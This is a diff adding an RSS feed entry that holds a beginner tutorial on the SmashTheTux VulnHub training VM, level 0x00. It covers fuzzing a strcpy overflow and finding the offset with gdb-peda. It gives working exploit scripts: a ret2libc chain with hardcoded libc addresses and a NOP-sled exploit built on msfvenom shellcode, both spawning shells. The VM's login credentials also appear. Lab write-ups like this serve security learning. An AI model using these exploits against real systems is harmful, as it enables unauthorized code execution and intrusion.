@@ -1,0 +1,1229 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
+    <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850</link>
+    <description>SmasTheTux is Vulnerable VM hosted by [VulnHub](https://vulnhub.com) and created by [CanYouPwnMe](https://canyoupwn.me/smashthetux-vm/)
+
+#### Disclaimer
+
+This is for educational purpose and I will try to explain this tutorial with beginner-friendly explanation as I can.
+
+SmashTheTux is a new VM made by canyoupwn.me for those who wants to take a step into the world of binary exploitation. This VM consists of 9 challenges, each introducing a different type of vulnerability. SmashTheTux covers basic exploitation of the following weaknesses:
+
+- Stack Overflow Vulnerability
+- Off-by-One Vulnerability
+- Integer Overflow
+- Format String Vulnerability
+- Race Conditions
+- File Access Weaknesses
+- Heap Overflow Vulnerability
+
+VM Description:
+
+```
+Name........: SmashTheTux: 1.0.1
+Date Release: 1 Apr 2016
+Author......: CanYouPwn.Me
+Series......: SmashTheTux
+Objective...: Leveling up from user
+Tester(s)...: h1tch1
+Twitter.....: https://twitter.com/D4rk36
+Credential..: tux:tux,root:1N33dP0w3r
+Filename....: SmashTheTux_v1.0.1.7z
+File size...: 616 MB
+MD5.........: 63FEDA288163D9155B1BF84D1C6C2814
+SHA1........: 01DCB1AB85B139A386AD97B41190731509612F59
+
+```
+
+Download link: https://www.vulnhub.com/entry/smashthetux-101,138/
+
+**Summary**
+
+In this first series, I will cover two topic:
+
+- Bypassing NX using ret2libc
+- Exploiting with execstack enable
+
+#### **Initial Setup**
+
+Login to SmasTheTux VM using Virtualbox, VMWare or other virtualization clients with the above credentials and then get the IP address from that for easy access:
+
+![tux-login|690x180](upload://yQFGKB7w4GU2wfE8tMsD8SABLWI.png) 
+
+#### **SSH**
+
+We will use ssh for remoting the VM because it&#39;s easy to use rather than debugging in the VM without scroll function, copy paste and other function. 
+
+```bash
+ssh tux@192.168.2.125
+The authenticity of host &#39;192.168.2.125 (192.168.2.125)&#39; can&#39;t be established.
+ECDSA key fingerprint is SHA256:f/.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.2.125&#39; (ECDSA) to the list of known hosts.
+                            _    _            _._ 
+                          .|_|_,&#39; |          /_ _`. 
+                          |       |          (.X.)| 
+                          `|`&#39;`-._|          |\_/&#39;| 
+                           | |               )____`\ 
+                           | |              //_V _\ \ 
+                           | |             ((  |  `(_) 
+                           | |            / \&gt; &#39;   / \ 
+                           | |            \  \.__./  / 
+                           | |             `-&#39;    `-&#39; 
+                           | |
+                          |` |
+                          `--&#39;
+         __                     _    _____ _         _____            
+        / _\_ __ ___   __ _ ___| |__/__   \ |__   __/__   \_   ___  __
+        \ \| &#39;_ ` _ \ / _` / __| &#39;_ \ / /\/ &#39;_ \ / _ \/ /\/ | | \ \/ /
+        _\ \ | | | | | (_| \__ \ | | / /  | | | |  __/ /  | |_| |&gt;  &lt; 
+        \__/_| |_| |_|\__,_|___/_| |_\/   |_| |_|\___\/    \__,_/_/\_\
+                                                                      
+                                                by canyoupwn.me
+
+tux@192.168.2.125&#39;s password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jul  8 10:10:30 2019
+tux@tux:~$ 
+
+```
+
+After successful login, we can see a list of files and tutorials for completing these challenges:
+
+```bash
+tux@tux:~$ ls -al
+total 288
+drwxr-xr-x 12 tux  tux   4096 Mar 12  2016 .
+drwxr-xr-x  3 root root  4096 Mar 11  2016 ..
+drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x00
+drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x01
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x02
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x03
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x04
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x05
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x06
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x07
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x08
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x09
+lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .bash_history -&gt; /dev/null
+-rw-r--r--  1 tux  tux    220 Mar 11  2016 .bash_logout
+-rw-r--r--  1 tux  tux   3545 Mar 11  2016 .bashrc
+lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .nano_history -&gt; /dev/null
+-rw-r--r--  1 tux  tux    675 Mar 11  2016 .profile
+-rw-r--r--  1 tux  tux    679 Mar 12  2016 README
+-rw-r--r--  1 tux  tux  20871 Mar 12  2016 TUTORIAL_formatstring
+-rw-r--r--  1 tux  tux  91044 Mar 11  2016 TUTORIAL_heapoverflow
+-rw-r--r--  1 tux  tux  27657 Mar 11  2016 TUTORIAL_integerbugs
+-rw-r--r--  1 tux  tux  18657 Mar 11  2016 TUTORIAL_offbyone
+-rw-r--r--  1 tux  tux  60996 Mar 11  2016 TUTORIAL_stackoverflow
+```
+
+For someone who have experienced with [Protostar](https://exploit.education/protostar/), this machine challenges is identical with that.
+
+#### **Level 0x00**
+
+We have binary file with the source code available:
+
+```c
+// gcc pwnme.c -o pwnme -fno-stack-protector
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln( char * arg ) {
+        char buf[256];
+        strcpy(buf, arg);
+}
+
+int main(int argc, char **argv) {
+        printf(&quot;Val: %s\n&quot;, argv[1]);
+        vuln(argv[1]);
+
+        return 0;
+}
+```
+
+The above code consist of vulnerable function:
+
+- `main()` function take the input as `argv[1]` and the pass the value to `vuln()` function
+- `char buf[256]; `define the buf variable with 256 bytes in length.
+- `strcpy(buf, arg);` copying buffer from `main()` to `arg` variable
+
+We know that `strcpy(3)` is a very unsafe function call in the C library and we should use `strlcpy(3)` or `snprintf`instead. 
+
+Why? Because by default no check for the size of data that will fit in the local buffer and blindly copies the data.
+
+**Fuzzing**
+
+We know that maximum length is 256 bytes for the user input defined before. We can use little python script for fuzzing the input in case we don&#39;t know the offset address:
+
+```python
+# tux@tux:~/0x00$ cat fuzz.py
+import os
+
+buffer=[&quot;A&quot;]
+counter=100
+
+while len(buffer) &lt;= 30:
+    buffer.append(&quot;A&quot; * counter)
+    counter=counter+100
+
+for string in buffer:
+    print(&quot;Fuzzing %s bytes&quot; % len(string))
+    os.system(&quot;./pwnme %s&quot; % string) 
+```
+
+Explanation:
+
+- Define first buffer as 100 bytes and then increase by 100 bytes per loop
+- Copy buffer to program parameter as an argument
+
+It will show this result:
+
+```bash
+tux@tux:~/0x00$ python fuzz.py 
+Fuzzing 1 bytes
+Val: A
+Fuzzing 100 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Fuzzing 200 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Fuzzing 300 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+Fuzzing 400 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+Fuzzing 500 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+------- long result cut ----------
+```
+
+From the above result, the program starting to crash/segmentation fault when we use 300 bytes as the input parameter. But what number exactly trigger that segfault? How to find the missing one? Let&#39;s use gdb-peda for doing this job. I will prefer gdb-peda instead of gdb for easy to use and more friendly.
+
+**Install Gdb-Peda**
+
+Don&#39;t forget to check if gdb is existed in the machine before using gdb-peda.
+
+```bash
+tux@tux:~/0x00$ gdb -v
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;i586-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
+```
+
+Because of a limited package in the remote machine, we need to download gdb-peda in local and then copy to the server using SCP or FTP.
+
+```
+# in host machine
+git clone https://github.com/longld/peda.git /home/user/peda
+scp -r /home/user/peda tux@192.168.2.125:/home/tux
+
+# from the tux machine
+echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
+echo &quot;DONE! debug your program with gdb and enjoy&quot;
+```
+
+We can check if peda is successfully installed with just running the gdb and see the result:
+
+```bash
+tux@tux:~/0x00$ gdb ./pwnme 
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;i586-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from ./pwnme...(no debugging symbols found)...done.
+gdb-peda$ 
+```
+
+Nah, we have `gdb-peda` installed. Let&#39;s do some check for binary security of that file. This is the first thing that I would do when starting Linux binary exploitation:
+
+```bash
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+```
+
+Hm... NX is enabled. So, what this means is that we can&#39;t execute our payload/shellcode in stack address because of NX(Non-Executable stack) prevention. Since the processor is not allowed to execute instructions placed on the stack.
+
+In order to bypass this mechanism, We can use `ret2lib`(return to libc or return to the C library) technique. In the simple definition, this attack doesn&#39;t require any shellcode to take control of the target vulnerable process because we can invoke classic built-in functions such as &quot;system, exit, etc&quot;.
+
+For more information about ret2libc, you can look at @IoTh1nkN0t explanation https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833
+
+**Finding Patterns**
+
+As we know that our program crash when using 300 bytes as input parameter, this is will be our clue for creating a pattern and finding the right offset with gdb-peda.
+
+```bash
+gdb-peda$ pattern create 300
+&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&#39;
+```
+
+```bash
+gdb-peda$ run &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&#39;
+Starting program: /home/tux/0x00/pwnme &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&#39;
+Val: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4b0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)
+EBX: 0xbffff5f0 --&gt; 0x2 
+ECX: 0xbffff8e0 (&quot;A%5A%KA%gA%6A%&quot;)
+EDX: 0xbffff5ce (&quot;A%5A%KA%gA%6A%&quot;)
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x64254148 (&#39;HA%d&#39;)
+ESP: 0xbffff5c0 (&quot;%IA%eA%4A%JA%fA%5A%KA%gA%6A%&quot;)
+EIP: 0x41332541 (&#39;A%3A&#39;)
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41332541
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff5c0 (&quot;%IA%eA%4A%JA%fA%5A%KA%gA%6A%&quot;)
+0004| 0xbffff5c4 (&quot;eA%4A%JA%fA%5A%KA%gA%6A%&quot;)
+0008| 0xbffff5c8 (&quot;A%JA%fA%5A%KA%gA%6A%&quot;)
+0012| 0xbffff5cc (&quot;%fA%5A%KA%gA%6A%&quot;)
+0016| 0xbffff5d0 (&quot;5A%KA%gA%6A%&quot;)
+0020| 0xbffff5d4 (&quot;A%gA%6A%&quot;)
+0024| 0xbffff5d8 (&quot;%6A%&quot;)
+0028| 0xbffff5dc --&gt; 0xb7e3fa00 (&lt;__libc_start_main+144&gt;:       mov    esi,DWORD PTR [eax+0x1d0])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41332541 i
+```
+
+Aha! We got a signal from our Lord with SIGSEGV(Segmentation Fault). From my experience, this is a possible signal to overflow the buffer. We get the offset at the end of result `0x41332541`. 
+
+We can check information register for EIP, EBP, ESP:
+
+```bash
+gdb-peda$  i r eip esp ebp
+eip            0x41332541       0x41332541
+esp            0xbffff5c0       0xbffff5c0
+ebp            0x64254148       0x64254148
+```
+
+What&#39;s next? checking the correct offset address:
+
+```bash
+gdb-peda$ pattern offset 0x41332541
+1093870913 found at offset: 268
+```
+
+Now, this is what we got so far:
+
+- EIP Offset 0x41332541
+- Offset Number 268
+- NX Enabled.
+
+**Exploiting with NX Enabled**
+
+First, We need to check if ASLR is enabled or not
+
+```
+$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+Good, ASLR is disabled for this machine. So, it will be easy for us because the address space value is not dynamically changed.
+
+```
+tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+```
+
+As we can see &quot;libc&quot; address is the same every time we check with ldd.
+
+**Finding Functions Address**
+
+For this purpose, We only need `system()`, `/bin/sh`, and `exit()` function. We will use system function and passing a shell as an argument and then invoke the exit function in order to terminate our system call. Start the program first.
+
+```bash
+gdb-peda$ start
+[----------------------------------registers-----------------------------------]
+EAX: 0x1 
+EBX: 0xb7fcf000 --&gt; 0x1a8da8 
+ECX: 0xbffff730 --&gt; 0x1 
+EDX: 0xbffff754 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff718 --&gt; 0x0 
+ESP: 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
+EIP: 0x804845a (&lt;main+15&gt;:      mov    ebx,ecx)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048456 &lt;main+11&gt;: mov    ebp,esp
+   0x8048458 &lt;main+13&gt;: push   ebx
+   0x8048459 &lt;main+14&gt;: push   ecx
+=&gt; 0x804845a &lt;main+15&gt;: mov    ebx,ecx
+   0x804845c &lt;main+17&gt;: mov    eax,DWORD PTR [ebx+0x4]
+   0x804845f &lt;main+20&gt;: add    eax,0x4
+   0x8048462 &lt;main+23&gt;: mov    eax,DWORD PTR [eax]
+   0x8048464 &lt;main+25&gt;: sub    esp,0x8
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
+0004| 0xbffff714 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
+0008| 0xbffff718 --&gt; 0x0 
+0012| 0xbffff71c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
+0016| 0xbffff720 --&gt; 0x80484a0 (&lt;__libc_csu_init&gt;:      push   ebp)
+0020| 0xbffff724 --&gt; 0x0 
+0024| 0xbffff728 --&gt; 0x0 
+0028| 0xbffff72c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Temporary breakpoint 1, 0x0804845a in main ()
+```
+
+After that, we can find the address we need.
+
+```
+gdb-peda$ find &quot;/bin/sh&quot;
+Searching for &#39;/bin/sh&#39; in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7f85a69 (&quot;/bin/sh&quot;)
+gdb-peda$ p &amp;exit
+$1 = (&lt;text variable, no debug info&gt; *) 0xb7e571b0 &lt;__GI_exit&gt;
+gdb-peda$ p &amp;system
+$2 = (&lt;text variable, no debug info&gt; *) 0xb7e643e0 &lt;__libc_system&gt;
+```
+
+Explanation:
+
+- system() address is 0xb7e643e0
+- exit() address is 0xb7e571b0
+- /bin/sh address 0xb7f85a69
+
+**Creating Payload**
+
+We can use this formula from the information we gathered before:
+
+&gt; Bytes Offset + System Address + Exit Address + Shell Address
+
+```
+268 + 0xb7e643e0 + 0xb7e571b0 + 0xb7f85a69
+```
+
+We can use python for doing exploitation
+
+```bash
+# cat bypass_nx.py
+from struct import *
+
+buf = &quot;&quot;
+buf += &quot;X&quot; * (268)
+buf += pack(&quot;&lt;L&quot;,0xb7e643e0) #system() address
+buf += pack(&quot;&lt;L&quot;,0xb7e571b0) #exit() address
+buf += pack(&quot;&lt;L&quot;,0xb7f85a69 ) #/bin/sh call address
+print buf
+```
+
+Time to exploit
+
+```
+tux@tux:~/0x00$ ./pwnme $(python bypass_nx.py)
+Val: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX�C淰q��iZ��
+$ ps
+  PID TTY          TIME CMD
+  816 pts/0    00:00:00 bash
+ 1092 pts/0    00:00:00 pwnme
+ 1094 pts/0    00:00:00 sh
+ 1098 pts/0    00:00:00 ps
+$ echo $0
+/bin/sh
+```
+
+Horrraaaayyyyyyyyy! We can spawn new shell. :partying_face::partying_face::partying_face::partying_face:
+
+&gt; In the end, We will return to libc
+
+**[BONUS] Exploiting with NX Disable**
+
+By default, the program compiled with NX protection and not allowed for executes the payload in stack address. For this bonus section, we can recompile using `execstack` parameter for gcc.
+
+```
+mv pwnme pwnme-nx
+gcc pwnme.c -o pwnme -fno-stack-protector -z execstack
+```
+
+Check with gdb-peda.
+
+```
+tux@tux:~/0x00$ gdb pwnme 
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;i586-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+Reading symbols from pwnme...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+```
+
+As you can see, NX protection is disabled for now. We need to know where we will jump by checking the `jmp call eax` address.
+
+Searching for jmp/eax call, this information will be useful when overwritting EIP Address.
+
+```bash
+gdb-peda$ jmpcall
+0x8048393 : call eax
+0x80483cd : call edx
+0x8048420 : call edx
+0x80485b7 : jmp [eax]
+0x8049393 : call eax
+0x80493cd : call edx
+0x8049420 : call edx
+0x80495b7 : jmp [eax]
+```
+
+We will use `0x8048393 : call eax` and note this address as return address.
+
+Now, this is what we got so far:
+
+- EIP Offset 0x41332541
+- Offset Number 268
+- return address 0x8048393
+- padding/nop =&gt; 268 - shellcode buf - 4
+
+We know that our offset is 268 and here is the formula I used:
+
+&gt; Padding + shellcode buf + return address
+
+**Generating Payload**
+
+For this purpose, we need Venom for creating the payload because Spiderman is far from home :P. I think 268 bytes is enough for basic `exec` linux payload. You may use other shellcode than venom. I&#39;m just prefer this for easy to use. I&#39;m exclude &quot;\x00\x0a\0d&quot; from shellcode payload as bad character.
+
+```bash
+↳ msfvenom -p linux/x86/exec CMD=/bin/bash -a x86 --platform linux  -f python -b &quot;\x00\x0a\0d&quot;
+WARNING: Nokogiri was built against LibXML version 2.9.8, but has dynamically loaded 2.9.9
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 72 (iteration=0)
+x86/shikata_ga_nai chosen with final size 72
+Payload size: 72 bytes
+Final size of python file: 358 bytes
+buf =  &quot;&quot;
+buf += &quot;\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29&quot;
+buf += &quot;\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93&quot;
+buf += &quot;\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45&quot;
+buf += &quot;\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2&quot;
+buf += &quot;\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66&quot;
+buf += &quot;\x6e\x4a\x76\xff\x8f\xb9\xf8&quot;
+```
+
+Okay, time for generating our final payload:
+
+```python
+import os
+
+# linux/x86/exec CMD=/bin/bash payload 
+# bad char : &quot;\x00\x0a\0d&quot;
+
+buf =  &quot;&quot;
+buf += &quot;\xb8\x72\x71\x70\x34\xda\xc8\xd9\x74\x24\xf4\x5a\x29&quot;
+buf += &quot;\xc9\xb1\x0c\x83\xea\xfc\x31\x42\x0f\x03\x42\x7d\x93&quot;
+buf += &quot;\x85\x5e\x8a\x0b\xff\xcd\xea\xc3\xd2\x92\x7b\xf4\x45&quot;
+buf += &quot;\x7a\x08\x93\x95\xec\xc1\x01\xff\x82\x94\x25\xad\xb2&quot;
+buf += &quot;\xac\xa9\x52\x43\x9f\xcb\x3b\x2d\xf0\x69\xdd\xc2\x66&quot;
+buf += &quot;\x6e\x4a\x76\xff\x8f\xb9\xf8&quot;
+
+# define offset
+offset = 268
+
+# (268 - 72) - 4 = 192
+padding = (offset - len(buf)) - 4
+
+# NOPSLED as identifer with total offset - size of the buf
+payload =  &quot;\x90&quot; * padding + buf
+
+# overwrite EIP to jump to &#39;call eax&#39; in little endians
+payload += &quot;\x93\x83\x04\08&quot;
+
+print payload
+```
+
+With that script, you don&#39;t need to worry thinking of how many padding you should use.
+
+Time to exploit:
+
+```bash
+tux@tux:~/0x00$ echo $$
+1335
+tux@tux:~/0x00$ ps
+  PID TTY          TIME CMD
+ 1335 pts/0    00:00:00 bash
+ 1437 pts/0    00:00:00 ps
+tux@tux:~/0x00$ ./pwnme $(python exploit.py)
+Val: �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������rqp4���t$�Z)ɱ
+                                      ���1BB}��^�
+                                                 ����Ғ{�E�������%����RC��;-�i��fnJv������8
+tux@tux:/home/tux/0x00$ echo $$
+1440
+tux@tux:/home/tux/0x00$ ps
+  PID TTY          TIME CMD
+ 1335 pts/0    00:00:00 bash
+ 1439 pts/0    00:00:00 sh
+ 1440 pts/0    00:00:00 bash
+ 1445 pts/0    00:00:00 ps
